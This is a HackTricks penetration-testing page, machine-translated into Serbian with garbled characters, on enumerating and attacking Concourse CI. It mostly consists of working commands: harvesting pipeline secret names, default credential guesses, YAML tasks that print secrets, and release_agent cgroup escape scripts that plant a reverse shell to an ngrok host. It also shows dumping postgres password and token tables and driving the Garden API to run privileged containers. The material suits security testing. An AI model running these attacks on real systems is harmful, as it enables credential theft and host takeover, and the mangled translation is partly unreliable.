# Concourse Enumeration & Attacks

## Concourse Enumeration & Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### User Roles & Permissions

Concourse dolazi sa pet uloga:

* _Concourse_ **Admin**: Ova uloga se dodeljuje samo vlasnicima **glavnog tima** (podrazumevani inicijalni concourse tim). Admini mogu **konfigurisati druge timove** (npr.: `fly set-team`, `fly destroy-team`...). Dozvole ove uloge ne mogu biti pogoÄ‘ene RBAC-om.
* **owner**: Vlasnici tima mogu **modifikovati sve unutar tima**.
* **member**: ÄŒlanovi tima mogu **Äitati i pisati** unutar **sredstava tima** ali ne mogu modifikovati postavke tima.
* **pipeline-operator**: Operatori pipeline-a mogu izvoditi **operacije pipeline-a** kao Å¡to su pokretanje gradnji i pinovanje resursa, meÄ‘utim ne mogu aÅ¾urirati konfiguracije pipeline-a.
* **viewer**: Gledaoci tima imaju **"samo za Äitanje"** pristup timu i njegovim pipeline-ima.

{% hint style="info" %}
Pored toga, **dozvole uloga owner, member, pipeline-operator i viewer mogu biti modifikovane** konfiguriÅ¡uÄ‡i RBAC (konfiguriÅ¡uÄ‡i preciznije njegove akcije). ProÄitajte viÅ¡e o tome na: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Napomena da Concourse **grupiÅ¡e pipeline-e unutar timova**. Stoga, korisnici koji pripadaju timu Ä‡e moÄ‡i da upravljaju tim pipeline-ima i **several Teams** moÅ¾e postojati. Korisnik moÅ¾e pripadati viÅ¡e timova i imati razliÄite dozvole unutar svakog od njih.

### Vars & Credential Manager

U YAML konfiguracijama moÅ¾ete konfigurisati vrednosti koristeÄ‡i sintaksu `((_source-name_:_secret-path_._secret-field_))`.\
[Iz dokumenata:](https://concourse-ci.org/vars.html#var-syntax) **source-name je opcionalan**, i ako se izostavi, koristiÄ‡e se [cluster-wide credential manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager), ili se vrednost moÅ¾e pruÅ¾iti [statiÄki](https://concourse-ci.org/vars.html#static-vars).\
**Opcionalni \_secret-field**\_ specificira polje na preuzetom tajnom podatku koje treba proÄitati. Ako se izostavi, menadÅ¾er kredencijala moÅ¾e odluÄiti da proÄita 'podrazumevano polje' iz preuzetog kredencijala ako polje postoji.\
Pored toga, _**secret-path**_ i _**secret-field**_ mogu biti okruÅ¾eni dvostrukim navodnicima `"..."` ako **sadrÅ¾e specijalne karaktere** kao Å¡to su `.` i `:`. Na primer, `((source:"my.secret"."field:1"))` Ä‡e postaviti _secret-path_ na `my.secret` i _secret-field_ na `field:1`.

#### Static Vars

StatiÄke varijable mogu biti specificirane u **koracima zadataka**:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Or koriÅ¡Ä‡enjem sledeÄ‡ih `fly` **argumenata**:

* `-v` ili `--var` `NAME=VALUE` postavlja string `VALUE` kao vrednost za var `NAME`.
* `-y` ili `--yaml-var` `NAME=VALUE` parsira `VALUE` kao YAML i postavlja ga kao vrednost za var `NAME`.
* `-i` ili `--instance-var` `NAME=VALUE` parsira `VALUE` kao YAML i postavlja ga kao vrednost za instancu var `NAME`. Pogledajte [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) da biste saznali viÅ¡e o instancama var.
* `-l` ili `--load-vars-from` `FILE` uÄitava `FILE`, YAML dokument koji sadrÅ¾i mapiranje imena var na vrednosti, i postavlja ih sve.

#### Upravljanje akreditivima

Postoje razliÄiti naÄini na koje se **UpravljaÄ akreditivima moÅ¾e specificirati** u pipeline-u, proÄitajte kako na [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Pored toga, Concourse podrÅ¾ava razliÄite upravljaÄe akreditivima:

* [UpravljaÄ akreditivima Vault](https://concourse-ci.org/vault-credential-manager.html)
* [UpravljaÄ akreditivima CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [UpravljaÄ akreditivima AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [UpravljaÄ akreditivima AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [UpravljaÄ akreditivima Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [UpravljaÄ akreditivima Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [KeÅ¡iranje akreditiva](https://concourse-ci.org/creds-caching.html)
* [Redigovanje akreditiva](https://concourse-ci.org/creds-redacting.html)
* [Ponovno pokuÅ¡avanje neuspeÅ¡nih preuzimanja](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Napomena da ako imate neku vrstu **pristupa za pisanje Concourse-u** moÅ¾ete kreirati poslove za **ekstrakciju tih tajni** jer Concourse mora imati moguÄ‡nost pristupa njima.
{% endhint %}

### Concourse Enumeracija

Da biste enumerisali Concourse okruÅ¾enje, prvo morate **prikupiti vaÅ¾eÄ‡e akreditive** ili pronaÄ‡i **autentifikovani token**, verovatno u `.flyrc` konfiguracionom fajlu.

#### Prijava i trenutni korisnik enum

* Da biste se prijavili, morate znati **endpoint**, **ime tima** (podrazumevano je `main`) i **tim kojem korisnik pripada**:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Dobijte konfigurisane **ciljeve**:
* `fly targets`
* Proverite da li je konfigurisana **veza cilja** joÅ¡ uvek **vaÅ¾eÄ‡a**:
* `fly -t <target> status`
* Dobijte **ulogu** korisnika u odnosu na navedeni cilj:
* `fly -t <target> userinfo`

{% hint style="info" %}
Napomena da je **API token** **saÄuvan** u `$HOME/.flyrc` podrazumevano, dok pretraÅ¾ujete maÅ¡ine mogli biste pronaÄ‡i akreditive tamo.
{% endhint %}

#### Timovi i korisnici

* Dobijte listu timova
* `fly -t <target> teams`
* Dobijte uloge unutar tima
* `fly -t <target> get-team -n <team-name>`
* Dobijte listu korisnika
* `fly -t <target> active-users`

#### Pipelines

* **Lista** pipelines:
* `fly -t <target> pipelines -a`
* **Dobijte** pipeline yaml (**osetljive informacije** mogu se naÄ‡i u definiciji):
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Dobijte sve **konfigurisane varijable** pipeline-a
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Dobijte sve **nazive tajni pipeline-a** koje se koriste (ako moÅ¾ete kreirati/modifikovati posao ili preuzeti kontejner, mogli biste ih ekstraktovati):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### Kontejneri i Radnici

* Lista **radnika**:
* `fly -t <target> workers`
* Lista **kontejnera**:
* `fly -t <target> containers`
* Lista **buildova** (da vidite Å¡ta se izvrÅ¡ava):
* `fly -t <target> builds`

### Concourse Napadi

#### Brute-Force Akcija na Kredencijale

* admin:admin
* test:test

#### Enumeracija Tajni i Parametara

U prethodnom odeljku smo videli kako moÅ¾ete **dobiti sve nazive i varijable tajni** koje koristi pipeline. **Varijable mogu sadrÅ¾ati osetljive informacije** i naziv **tajni Ä‡e biti koristan kasnije za pokuÅ¡aj kraÄ‘e**.

#### Sesija unutar pokrenutog ili nedavno pokrenutog kontejnera

Ako imate dovoljno privilegija (**Älan ulogu ili viÅ¡e**) moÄ‡i Ä‡ete da **listaÅ¡ pipelines i uloge** i jednostavno dobijete **sesiju unutar** `<pipeline>/<job>` **kontejnera** koristeÄ‡i:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
Sa ovim dozvolama moÅ¾da Ä‡ete moÄ‡i da:

* **Ukç›—ite tajne** unutar **kontejnera**
* PokuÅ¡ate da **pobegnete** na Ävor
* EnumeriÅ¡ete/Iskoristite **cloud metadata** endpoint (iz poda i sa Ävora, ako je moguÄ‡e)

#### Kreiranje/Modifikacija Pipeline-a

Ako imate dovoljno privilegija (**Älan ulogu ili viÅ¡e**) moÄ‡i Ä‡ete da **kreirate/modifikujete nove pipeline-ove.** Pogledajte ovaj primer:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Sa **modifikacijom/kreiranjem** novog pipeline-a moÄ‡i Ä‡ete da:

* **Ukç›—** **tajne** (putem njihovog ispisivanja ili ulaskom u kontejner i pokretanjem `env`)
* **Pobegnete** na **Ävor** (dajuÄ‡i vam dovoljno privilegija - `privileged: true`)
* Enumerirate/Iskoristite **cloud metadata** endpoint (iz poda i sa Ävora)
* **ObriÅ¡ete** kreirani pipeline

#### IzvrÅ¡ite PrilagoÄ‘eni Zadatak

Ovo je sliÄno prethodnoj metodi, ali umesto modifikacije/kreiranja celog novog pipeline-a, moÅ¾ete **samo izvrÅ¡iti prilagoÄ‘eni zadatak** (Å¡to Ä‡e verovatno biti mnogo **diskretnije**):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### Bekstvo na Ävor iz privilegovane zadatke

U prethodnim sekcijama smo videli kako da **izvrÅ¡imo privilegovanu zadatak sa concourse**. Ovo neÄ‡e dati kontejneru potpuno isti pristup kao privilegovana oznaka u docker kontejneru. Na primer, neÄ‡ete videti ureÄ‘aj datoteke Ävora u /dev, tako da bi bekstvo moglo biti "kompleksnije".

U sledeÄ‡em PoC-u Ä‡emo koristiti release\_agent da pobegnemo sa nekim malim izmenama:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
Kao Å¡to ste moÅ¾da primetili, ovo je samo [**redovna release\_agent eskapada**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md) samo modifikovanjem putanje cmd-a u Ävoru
{% endhint %}

#### Eskapiranje u Ävor iz Worker kontejnera

Redovna release\_agent eskapada sa manjom modifikacijom je dovoljna za ovo:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### Escaping to the node from the Web container

ÄŒak i ako web kontejner ima neke odbrane onemoguÄ‡ene, **ne radi kao uobiÄajen privilegovan kontejner** (na primer, **ne moÅ¾ete** **montirati** i **kapaciteti** su veoma **ograniÄeni**, tako da su svi laki naÄini za bekstvo iz kontejnera beskorisni).

MeÄ‘utim, Äuva **lokalne akreditive u Äistom tekstu**:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
MoÅ¾ete koristiti te akreditive da **se prijavite na veb server** i **napravite privilegovani kontejner i pobegnete na Ävor**.

U okruÅ¾enju takoÄ‘e moÅ¾ete pronaÄ‡i informacije za **pristup postgresql** instanci koju koristi concourse (adresa, **korisniÄko ime**, **lozinka** i baza podataka meÄ‘u ostalim informacijama):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### Zloupotreba Garden servisa - Nije pravi napad

{% hint style="warning" %}
Ovo su samo neke zanimljive beleÅ¡ke o servisu, ali poÅ¡to sluÅ¡a samo na localhost-u, ove beleÅ¡ke neÄ‡e imati nikakav uticaj koji veÄ‡ nismo iskoristili ranije.
{% endhint %}

Podrazumevano, svaki concourse radnik Ä‡e pokretati [**Garden**](https://github.com/cloudfoundry/garden) servis na portu 7777. Ovaj servis koristi Web majstor da oznaÄi radniku **Å¡ta treba da izvrÅ¡i** (preuzmi sliku i pokreni svaku zadatak). Ovo zvuÄi priliÄno dobro za napadaÄa, ali postoje neka dobra zaÅ¡tita:

* On je samo **izloÅ¾en lokalno** (127..0.0.1) i mislim da kada se radnik autentifikuje prema Web-u sa posebnim SSH servisom, stvara se tunel tako da web server moÅ¾e **da komunicira sa svakim Garden servisom** unutar svakog radnika.
* Web server **prati pokretne kontejnere svake nekoliko sekundi**, i **neoÄekivani** kontejneri se **briÅ¡u**. Dakle, ako Å¾elite da **pokrenete prilagoÄ‘eni kontejner**, morate da **manipuliÅ¡ete** sa **komunikacijom** izmeÄ‘u web servera i garden servisa.

Concourse radnici rade sa visokim privilegijama kontejnera:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
MeÄ‘utim, tehnike poput **montiranja** /dev ureÄ‘aja Ävora ili release\_agent **neÄ‡e raditi** (jer pravi ureÄ‘aj sa datoteÄnim sistemom Ävora nije dostupan, samo virtuelni). Ne moÅ¾emo pristupiti procesima Ävora, pa je bekstvo iz Ävora bez kernel exploit-a komplikovano.

{% hint style="info" %}
U prethodnom odeljku smo videli kako da pobegnemo iz privilegovanog kontejnera, tako da ako moÅ¾emo **izvrÅ¡iti** komande u **privilegovanom kontejneru** koji je kreirao **trenutni** **radnik**, mogli bismo **pobegnuti na Ävor**.
{% endhint %}

Napomena: igrajuÄ‡i se sa concourse-om primetio sam da kada se novi kontejner pokrene da bi neÅ¡to izvrÅ¡io, procesi kontejnera su dostupni iz radnog kontejnera, tako da je to kao kontejner koji stvara novi kontejner unutar sebe.

**Ulazak u pokrenuti privilegovani kontejner**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**Kreiranje novog privilegovanog kontejnera**

MoÅ¾ete vrlo lako kreirati novi kontejner (samo pokrenite nasumiÄni UID) i izvrÅ¡iti neÅ¡to na njemu:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
MeÄ‘utim, veb server proverava svake nekoliko sekundi kontejnere koji se izvrÅ¡avaju, i ako se otkrije neoÄekivani, biÄ‡e obrisan. PoÅ¡to se komunikacija odvija u HTTP-u, mogli biste da manipuliÅ¡ete komunikacijom kako biste izbegli brisanje neoÄekivanih kontejnera:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## Reference

* https://concourse-ci.org/vars.html

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
